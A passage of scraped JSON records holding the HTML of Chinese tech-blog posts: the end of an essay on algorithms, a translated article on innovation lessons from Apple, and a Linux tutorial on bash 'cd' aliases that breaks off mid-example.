graf-after--p\">这抽象算法的一步会走得更远。它不仅能帮我们找出数据中隐藏的模式，甚至还能帮我们写算法的代码。在Pedro Domingos写的“终极算法”这本书里，描述了一种“学习算法”，通过机器学习的手段，这种算法不但能够创造新的算法，而且还能写出我们需要的代码，这样计算机就能“自己写代码了，就把人类从编码中解放出来。”为了达到这样的目的，我们就必须对这些算法的工作原理有更好的了解，并通过改进这些算法，让它们能够更贴合我们的需要。不然，我们就没法充分发挥这种抽象转变的巨大潜力。</p>\n<blockquote id=\"6a1d\" class=\"graf graf--pullquote graf--startsWithDoubleQuote graf-after--p\"><p>“工业革命把人类从手工劳动中解放出来，而信息革命将人类从脑力劳动中解放出来，但是机器学习则是让计算机解放了自己。如果没有机器学习，程序员将成为革命进程的瓶颈；有了它，进度就不成问题。”——Pedro Domingos, “终极算法”</p></blockquote>\n<h3 id=\"611f\" class=\"graf graf--h3 graf-after--pullquote\">关于算法的思考</h3>\n<p id=\"0a36\" class=\"graf graf--p graf-after--h3\">在从具体有限的计算向抽象计算过度的过程中，我们还是需要各种各样的程序员的。不过这不是问题的关键。我不是要说编程不重要，也不是说编程不会做出贡献了。我想表达的观点是，我们需要开始对算法加以重视。算法并不仅仅是数学家需要关心，或者在学校里面才会用的东西。其实我们在编程的时候，算法就在我们周围，只是大家觉得不需要知道算法的实现或者原理罢了。目前，已经有人在致力于把更先进的技术（例如遗传算法）应用到大数据上，从而探索在不同领域进行优化和改进的可能了。甚至有人对金属冷却的过程进行建模，然后创建了效率更好的优化算法。（这种算法叫做“退火法”，这是一个从非常规角度思考算法的好例子，感兴趣的可以了解一下。）</p>\n<p id=\"97b4\" class=\"graf graf--p graf-after--p graf--trailing\">目前，编程已经被提高到了和读书、写字一样的地位，在新的数字化经济时代成为了一个关键技能。这种热度反而掩盖了我们对算法的看法。算法逐渐成为我们生活的一部分：想想那些网上电影推荐，新闻推荐，正是算法根据我们的行为归纳了我们的模式。我们需要对算法加深理解，只有这样，我们才能更加深刻地理解我们的未来。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>\n                        <img src=\"http://www.jobbole.com/wp-content/uploads/2016/04/78805a221a988e79ef3f42d7c5bfd4187.jpeg\">\n            \n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110841\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110841votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110841\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/huangxiaofei\">黄小非</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/huangxiaofei\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/avatars/5423/Corbis-42-221258652.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            黄小非：毕业于重庆大学计算机系，南开大学软件工程硕士，SCJP。 目前在一家国企信息中心任职软件开发工程师。主要技术兴趣为Java平台相关技术、系统构架、C/C++、计算机图形学等。（新浪微博：@黄小非）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/huangxiaofei\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/huangxiaofei/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/huangxiaofei/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 58</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/9184208f96827c412ab7d3570590ef76.jpg"], "fav_nums": 7, "comment_nums": 5, "create_date": "2017/04/11", "praise_nums": 3}
{"tags": "职场,创新,苹果", "front_image_path": "full/e422e0f26aa6ddd2315c235c43312dd8eea5c12a.jpg", "title": "在苹果工作 12 年学到的创新经验", "url_object_id": "011e247f3b60e5e815d4f086cc1f1155", "url": "http://blog.jobbole.com/110957/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/wx2803614675\">枫轻</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.fastcompany.com/3058271/lessons-learned/three-lessons-on-innovation-i-learned-during-my-12-years-at-apple\">Kelli Richards</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>作为苹果早期进入数字音乐领域的老将，她解释道，没有什么像寻求共识那样拖慢事情。</p>\n<p>在 Apple Music 之前，在 iPad 之前，甚至在 MP3 之前，我能够从台前幕后接触到数字音乐革命。</p>\n<p>从 20 世纪 80 年代末到 21 世纪初，我在苹果公司就职 12 年，我领导团队推出了苹果公司在音乐和娱乐方面最早的一些创新。我们制定了战略、营销举措、以及与内容创造者和媒体公司的关系，包括音乐、电影和电视，为之后 iTunes 和随后的创新奠定了基础。</p>\n<p>从那时起，我的朋友兼同事 Dave Ulmer 撰写了关于创新和公司文化的书（或其中的一本）。他在自己的著作《创新者的灭绝中 |The Innovator’s Extinction》总结了，其中有三个关键的经验教训，描述了我在苹果公司的经历，让我觉得比以往更有感触。</p>\n<h3>1. 共识不是你的朋友</h3>\n<p>没有什么比等待每个人同意更拖慢工作了。我很幸运在苹果有很大的自由度；我与公司内的主要艺术家和显要人物打交道的方式完全由我自己决定。我的上级没有经验、背景或洞察力去引导那些杰出的人，他们满足现状。</p>\n<p>当我不得不与 Fred Astaire 的遗孀 Robyn Smith 进行谈判，例如在一场活动中使用她丈夫形象的权利，有一些棘手的时刻。但因为我习惯于处理名人需求，知道如何与他们打交道，我们处理了关注点，不动声色地谈出了成功的结果。苹果管理层放手，让我以一种皆大欢喜的方式推动这些努力。</p>\n<p>首先公司需要为团队领导者提供高度的独立性，以便进行创新。然后，一旦你得到预算和授权，你需要利用这两者。不要在方法上因为达成共识而停止不前。这是关于专业知识的相互尊重，如果你正在与其他创新者合作，不要指望他们停下来和你建立共识。我认识的天才艺术家，从来没有停下来问许可，他们直接创造。</p>\n<h3>2. 不要为了寻求中间反馈而踌躇不前</h3>\n<p>把创新主意试验并付诸行动，你不需要（也不应该）等待批准。需要临时批准和持续的进度报告，这会阻碍创新。如果你经常要半途停下来去展示你的工作，一直要对自己做事后批评，这样不会有真正的突破。</p>\n<p>当然，这并不意味需要采取完全放任的方法，但确实需要一种文化，这种文化信任创新者能去把握自己的工作。这么做很有可能会需要大量的合作，所有这些都不需要一轮轮的盖章批准。在苹果公司开展跨职能的复杂营销活动时，我自己与整个公司的同事协商，但只让他们提供与其专业非常相关的材料反馈。</p>\n<p>当时，这种类型的跨部门协作并不是苹果公司常见的做法，各自为队才是常态。所以我的同事对有了发言权和表决权而感到激动。那些努力不仅加强了营销活动，而且使我能够与那些同事建立更深层次的长期关系。</p>\n<p>例如，当我们创建了一个针对音乐、电影和电视行业的活动时，我在营销和工程团队中制作了我们正在进行的材料的草稿。他们很高兴能参与，并在产品的信息传递和定位中发挥作用。我事先没有征求管理层的批准；我主动发起，通过自己的判断，最终得到所有人的赞赏。</p>\n<h3>3. 提防多数人所接受的看法</h3>\n<p>柯达的故事现在广为人知：它曾经是相机技术的领导者，一度占美国 90% 的胶片市场和 85% 的相机市场，甚至发明了数码相机。但是，由于不愿意改变其内部现状，柯达很快发现身处它曾经帮助创立的市场的边缘了。</p>\n<p>谈到创新，这种现象太普遍。如果你的团队不愿意质疑大多数人所接受的看法，推动他们这样去做就是你的任务了。奇怪的是，让苹果管理层相信音乐和娱乐才是关键市场，这对我的确是一项真正的挑战。然后 Steve Jobs 返回公司，并推出了 iPod 和 iTunes，这两者都用到了我们之前打下的基础，在最初的几年，发展神速。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fexsun866uj20mf0cnwjt.jpg\" width=\"690\" height=\"389\"></p>\n<p style=\"text-align: center;\">[PHOTO: FLICKR USER <a href=\"https://www.flickr.com/photos/guimo/270132714/\" target=\"_blank\">GUILLERMO</a>]</p>\n<p>在企业环境中战胜现状可能很棘手。如果你发现自己正在推动一个不情愿的团队去创新时，尝试以下策略：</p>\n<p>① 为你当前的策略创建一个风险评估（risk profile），就像为一次新机会做的那样。看看你已经知道的趋势，并且考虑你将不可避免地会面临一些迄今为止没有遇到的事，维持现状是怎样增加了你的风险？展示你推荐的步伐将如何提高投资回报率。请记住，用可以引起管理层会产生共鸣的方式来定义投资回报率。</p>\n<p>② 犹豫不决时，帮助队友更加舒适地在不完整信息条件下采取行动。自问一下，“在决策前，我们真正需要知道多少？”</p>\n<p>③ 外交解决阻碍公司的地盘战。当新产品冒着蚕食旧业务的风险时，情绪不可避免地升温。尽管如此，内部部门竞争比外部竞争对手更利于创新。</p>\n<p>④ 公司不能保持停滞，这就意味着要更好地认识和实现创新。没有它，我们就不会推动下一次改革。</p>\n<p>Kelli Richards 是 The All Access Group 的 CEO。她在创新技术公司，人才和媒体公司以及品牌之间，促进数字分销的战略商业机会。她也是畅销电子书《The Magic and Moxie of Apple: An Insider’s View》的作者。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110957\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110957votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110957\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx2803614675\">枫轻</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx2803614675\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/d84bcbb0a1f4aa3fdae3199108091382.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            软件工程+英语 本科双学位，JAVA 程序媛 92 年一枚，语言主要涉及 JAVA/C/C# ，爱折腾各种新技术，工作中涉及 Mongodb，Nginx  等，欢迎交流学习        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/wx2803614675\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/wx2803614675/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/wx2803614675/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 12</a> · <a title=\"个人微信：1091149131\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx4.sinaimg.cn/mw690/7cc829d3gy1fexsun866uj20mf0cnwjt.jpg"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/04/24", "praise_nums": 1}
{"tags": " 1 评论 ,IT技术,命令行", "front_image_path": "full/37f89584fe110760843b450fd866b3d6a305df19.jpg", "title": "Linux 命令行工具使用小贴士及技巧（4）", "url_object_id": "b82e24ca3b6f49d1750e049329ce3f09", "url": "http://blog.jobbole.com/110848/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.howtoforge.com/tutorial/command-line-aliases-in-linux/\">Ansh</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-8393-1.html\">ictlyh</a>   </div><p>到目前为止，在该系列指南中，我们已经讨论了 <a href=\"http://blog.jobbole.com/110739/\">cd –</a> 和 <a href=\"http://blog.jobbole.com/110774/\">pushd/popd 命令</a>的基本使用方法和相关细节，以及 <a href=\"http://blog.jobbole.com/110845/\">CDPATH 环境变量</a>。在这第四期、也是最后一期文章中，我们会讨论别名的概念以及你可以如何使用它们使你的命令行导航更加轻松和平稳。</p>\n<p>一如往常，在进入该指南的核心之前，值得指出本文中的所有命令以及展示的例子都在 Ubuntu 14.04LTS 中进行了测试。我们使用的命令行 shell 是 bash（4.3.11 版本）。</p>\n<h3 id=\"toc_1\">Linux 中的命令行别名</h3>\n<p>按照外行人的定义，别名可以被认为是一个复杂命令或者一组命令（包括它们的参数和选项）的简称或缩写。所以基本上，使用别名，你可以为那些不那么容易书写/记忆的命令创建易于记忆的名称。</p>\n<p>例如，下面的命令为 <code>cd ~</code> 命令创建别名 <code>home</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37fbf601362793\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias home=\"cd ~\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fbf601362793-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fbf601362793-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37fbf601362793-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"cd ~\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fbf601362793-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这意味着现在在你的系统中无论何地，无论何时你想要回到你的主目录时，你可以很快地输入 <code>home</code> 然后按回车键实现。</p>\n<p>关于 <code>alias</code> 命令，man 手册是这么描述的：</p>\n<blockquote><p>alias 工具可以创建或者重定义别名定义，或者把现有别名定义输出到标准输出。别名定义提供了输入一个命令时应该被替换的字符串值</p>\n<p>一个别名定义会影响当前 shell 的执行环境以及当前 shell 的所有子 shell 的执行环境。按照 IEEE Std 1003.1-2001 规定，别名定义不应该影响当前 shell 的父进程以及任何 shell 调用的程序环境。</p></blockquote>\n<p>那么，别名到底如何帮助命令行导航呢？这是一个简单的例子：</p>\n<p>假设你正在 <code>/home/himanshu/projects/howtoforge</code> 目录工作，它包括很多子目录以及子子目录。例如下面就是一个完整的目录分支：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37fc9656470448\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/home/himanshu/projects/howtoforge/command-line/navigation/tips-tricks/part4/final\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fc9656470448-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fc9656470448-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37fc9656470448-1\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">himanshu</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">projects</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">howtoforge</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">command</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">line</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">navigation</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tips</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tricks</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">part4</span><span class=\"crayon-o\">/</span><span class=\"crayon-m\">final</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fc9656470448-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>现在想象你在 <code>final</code> 目录，然后你想回到 <code>tips-tricks</code> 目录，然后再从那里，回到 <code>howtoforge</code> 目录。你会怎么做呢？</p>\n<p>是的，一般情况下，你会运行下面的一组命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37fcd269876968\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd ../..\r\n\r\ncd ../../..\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fcd269876968-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fcd269876968-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fcd269876968-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fcd269876968-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37fcd269876968-1\"><span class=\"crayon-i\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fcd269876968-2\"> </div><div class=\"crayon-line\" id=\"crayon-594b21ef37fcd269876968-3\"><span class=\"crayon-i\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fcd269876968-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>虽然这种方法并没有错误，但它绝对不方便，尤其是当你在一个很长的路径中想往回走例如说 5 个目录时。那么，有什么解决办法吗？答案就是：别名。</p>\n<p>你可以做的是，为每个 <code>cd ..</code> 命令创建容易记忆（和书写）的别名。例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37fd1248643362\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias bk1=\"cd ..\"  \r\nalias bk2=\"cd ../..\"  \r\nalias bk3=\"cd ../../..\"  \r\nalias bk4=\"cd ../../../..\"  \r\nalias bk5=\"cd ../../../../..\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" 